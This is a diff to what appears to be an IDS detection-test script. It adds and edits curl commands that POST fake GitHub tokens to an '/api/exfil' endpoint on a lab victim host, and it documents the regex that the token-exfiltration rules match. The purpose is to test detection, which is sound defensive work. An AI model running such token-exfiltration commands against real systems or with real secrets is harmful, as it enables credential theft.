@@ -776,7 +776,7 @@ for tld in .io .xyz .tk; do
 done
 
 # GitHub Actions token theft pattern
-curl -s -o /dev/null -X POST -d 'token=ghs_fakefakefakefakefake&repo=victim/repo' \
+curl -s -o /dev/null -X POST -d 'token=ghs_fakefakefakefakefakefakefakefakefake01&repo=victim/repo' \
   "http://${VICTIM_IP}/api/exfil" || true
 
 # Docker Hub image typosquatting
@@ -1074,6 +1074,20 @@ if command -v flightsim >/dev/null 2>&1; then
 else
   echo "  flightsim not installed; skipping"
 fi
+
+# ---------- GitHub token exfil — plain-HTTP POST (SIDs 9000504 / 9000505) ----------
+# Rules 9000504/9000505 match on http.request_body with pcre:/gh[sp]_[A-Za-z0-9]{36,}/
+# so the POST must be plain HTTP (TLS hides the body) and the token must
+# be >= 36 chars after the prefix. The existing probe at line ~779 had
+# only 20 chars of fake token — below threshold. These POSTs go to
+# nginx on :80 which responds 200 ok.
+echo "[33a] github-token-exfil (plain-HTTP POST with full-length ghp_/ghs_ tokens)"
+timeout 10 curl -s -o /dev/null --max-time 5 -X POST \
+  -d 'token=ghp_0123456789abcdef0123456789abcdef01234567' \
+  "http://${VICTIM_IP}/api/exfil" || true
+timeout 10 curl -s -o /dev/null --max-time 5 -X POST \
+  -d 'token=ghs_abcdef0123456789abcdef0123456789abcdef01' \
+  "http://${VICTIM_IP}/api/exfil" || true
 
 # ---------- Vulhub-targeted exploitation ----------
 # These hit the deliberately-vulnerable listeners installed by
